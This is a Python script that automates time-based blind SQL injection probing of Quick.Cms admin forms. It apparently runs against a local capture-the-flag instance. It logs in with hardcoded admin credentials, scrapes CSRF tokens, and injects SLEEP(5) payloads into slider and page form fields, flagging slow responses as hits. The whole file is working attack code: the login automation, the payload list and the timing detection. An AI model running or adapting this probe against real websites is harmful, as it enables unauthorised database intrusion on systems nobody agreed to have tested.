#!/usr/bin/env python3
"""Blind SQLi probe on Quick.Cms admin forms (CVE-2026-33385-like) via office proxy.
Baseline: valid save; then inject into each field and compare timing."""
import requests, re, time, sys

BASE = "http://127.0.0.1:8765/"
s = requests.Session()
r = s.post(BASE + "admin.php?p=login",
           data={"sEmail": "contextgrave-admin@chal.sh", "sPass": "admin",
                 "bAcceptLicense": "1", "iAcceptLicense": "true"}, timeout=30)
assert "p=logout" in r.text, "login failed"

def csrf(page):
    h = s.get(BASE + "admin.php?p=" + page, timeout=30).text
    return re.search(r'name="sCsrfToken" value="([0-9a-f]+)"', h).group(1)

def time_save(page, data):
    t0 = time.time()
    r = s.post(BASE + "admin.php?p=" + page, data=data, timeout=60)
    return time.time() - t0, r.status_code, len(r.text), r.text[:120]

# baseline valid slider save (upload not needed? try minimal fields)
page = "sliders-form"
c = csrf(page)
base = {"sCsrfToken": c, "sOption": "save", "sDescription": "SQLi probe"}
d, code, ln, snip = time_save(page, base)
print("BASE:", round(d, 2), code, ln)

sqli_points = ["sDescription", "sFileName", "iPosition"]
payloads = [
    ("sleep", "x', SLEEP(5), '"),
    ("sleep-paren", "x'||SLEEP(5)||'"),
    ("sleep-if", "x' AND SLEEP(5) AND '1'='1"),
    ("quote", "x'"),
]
for f in sqli_points:
    for name, pay in payloads:
        c = csrf(page)
        d, code, ln, snip = time_save(page, {**base, "sCsrfToken": c, f: pay})
        flag = " <-- SLOW" if d > 4.5 else ""
        print(f"{f} {name}: {round(d,2)}s {code} {ln}{flag}")
        if d > 4.5:
            print("HIT!", snip)
# also pages-form fields
page = "pages-form&iPage=1"
c = csrf(page)
pbase = {"sCsrfToken": c, "sOption": "save", "sName": "Upcoming Events",
         "sUrl": "", "sRedirect": "", "sTitle": "", "sDescriptionMeta": "",
         "iStatus": "1", "iPage": "1", "iPosition": "1", "iMenu": "1", "iTheme": "1"}
for f in ("sName", "sUrl", "sTitle", "sDescriptionMeta", "iPosition"):
    c = csrf(page)
    d, code, ln, snip = time_save(page, {**pbase, "sCsrfToken": c, f: "x', SLEEP(5), 'x"})
    print(f"pages {f}: {round(d,2)}s {code} {ln} {'<-- SLOW' if d>4.5 else ''}")
print("done")